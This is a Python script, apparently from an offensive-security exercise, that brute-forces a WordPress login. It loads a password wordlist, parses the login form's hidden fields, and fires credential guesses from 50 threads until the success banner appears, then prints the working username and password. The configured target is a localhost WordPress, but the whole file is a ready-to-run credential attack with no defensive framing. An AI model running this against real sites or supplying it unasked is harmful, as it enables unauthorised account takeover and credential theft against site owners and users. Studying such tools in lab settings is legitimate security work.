from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = "Welcome to WordPress"
TARGET = "http://localhost:81/wordpress/wp-login.php"
WORDLIST = "/home/nine/seclists/Passwords/Software/cain-and-abel.txt"

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()

    for word in raw_words.split():
        words.put(word)

    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for elem in tree.findall("//input"):
        name = elem.get("name")
        if name is not None:
            params[name] = elem.get('value', None)

    return params

class Bruter:
    def __init__(self, username, url):
        self.url = url
        self.username = username
        self.password_count = 0
        self.found = False
        self.failed_message_displayed = False

        print(f"\nBrute Force attack beginning on {url}")
        print(f"Finished the setup where username = {username}")

    def run_bruteforce(self, passwords):
        self.password_count = passwords.qsize()
        for _ in range(50):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
            
        if passwords.empty() and not self.found and not self.failed_message_displayed:
            print(f"Could not find credentials with {WORDLIST}")
            self.failed_message_displayed = True
    
        q = input()


    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)

        params = get_params(resp0.content)
        params["log"] = self.username

        while not passwords.empty() and not self.found:
            # time.sleep(2)

            passwd = passwords.get()
            params["pwd"] = passwd
            
            count = self.password_count - passwords.qsize()
            percentage = count * 100 / self.password_count
            print(f"{count:>6} ({percentage:.2f}%) => Trying username/password: {self.username}/{passwd:<10}")

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"Credentials found: {self.username}/{passwd}")

if __name__ == "__main__":
    words = get_words()
    
    b = Bruter("nniinnee", TARGET)
    b.run_bruteforce(words)

